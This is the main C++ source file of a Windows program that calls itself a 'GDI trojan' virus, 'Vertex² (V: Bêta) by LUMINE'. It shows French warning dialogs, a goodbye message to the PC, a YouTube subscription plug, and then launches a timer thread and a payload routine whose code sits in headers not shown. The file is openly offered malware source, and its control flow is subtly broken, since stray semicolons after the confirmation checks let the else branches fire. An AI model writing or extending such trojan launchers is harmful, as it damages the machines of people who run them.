#include <Windows.h>
#include "payloads.h"
#include "timer.h"
#include "main.h"
#include "Main.hpp"
INT
WINAPI /*
        * This WINAPI macro expands to __stdcall, which is a calling convention.
        * If you set the calling convention to __stdcall in project properties,
        * this is unneeded and can be removed.
        */

    wWinMain(
        _In_     HINSTANCE hInstance,
        _In_opt_ HINSTANCE hPrevInstance,
        _In_     PWSTR     szCmdLine,
        _In_     INT       nShowCmd
    )

{
    int main(); {


        if (MessageBox(NULL, "Bonjour, ceci est un virus (type GDI trojan payloads) donc si vous vous l'utiliser, prenez un machine virtuelle et ne l'activer pas ! Donc, je repose ma question d'une autre manière, êtes-vous sûr de vouloir éxécuter le VIRUS ?", "Vertex² (V: Bêta) by LUMINE", MB_YESNO | MB_ICONWARNING) == IDYES); else return (0);
        if (MessageBox(NULL, "Bon, ok mais c'est à vos risque et péril !!! êtes vous vraiment sûr à 200000 % de voulir l'ouvrir ???", "Vertex² (V: Bêta) by LUMINE", MB_YESNO | MB_ICONWARNING) == IDYES); else return (0);
        MessageBox(NULL, "OK BONNE CHANCE!!!!", "Vertex² (V: Bêta) by LUMINE", MB_OK | MB_ICONWARNING);

        MessageBox(NULL, "Bye the pc", "Vertex² (V: Bêta) by LUMINE", MB_OK | MB_ICONERROR);
        MessageBox(NULL, "Au revoir snif :(", "Vertex² (V: Bêta) by LUMINE", MB_OK | MB_ICONERROR);
        MessageBox(NULL, "Adios amigo", "Vertex² (V: Bêta) by LUMINE", MB_OK | MB_ICONERROR);
        MessageBox(NULL, "MRC WIPET ABONNEZ-VOUS, METTEZ UN POUCE BLEU ET ACTIVÉ LA CLOCHE DE NOTIFICATION ;)", "Vertex² (V: Bêta) by LUMINE", MB_OK | MB_ICONERROR);
        

        CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)InitializeTimer, (PVOID)10, 0, NULL);
        ExecutePayload(Payload1, 1000);
        

    }

}
